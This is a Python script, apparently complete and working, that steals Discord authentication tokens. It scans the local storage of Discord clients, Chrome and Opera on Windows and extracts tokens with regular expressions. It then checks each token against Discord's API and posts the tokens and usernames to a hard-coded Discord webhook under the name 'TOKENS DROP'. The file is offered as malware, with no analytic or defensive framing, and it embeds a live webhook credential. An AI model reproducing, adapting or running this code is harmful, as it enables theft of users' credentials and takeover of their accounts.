
import os
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
web1 = "https://discord.com/api/webhooks/1117803896023289979/sqHXygYrvVXtX8DVHm7ugfybpDvhlk0beCcde_kwQpMkWA1N_3jpfkFvqhd_zNn0qnRj"
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\Discord",
    "Discord Canary": rm + "\\discordcanary",
    "Discord PTB": rm + "\\discordptb",
    "Google Chrome": lc + "\\Google\\Chrome\\User Data\\Default",
    "Opera": rm + "\\Opera Software\\Opera Stable"
}
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
def tukan(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def grabber():
    em = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)
    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }
    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
    except:
        pass
if __name__ == '__main__':
    grabber()
                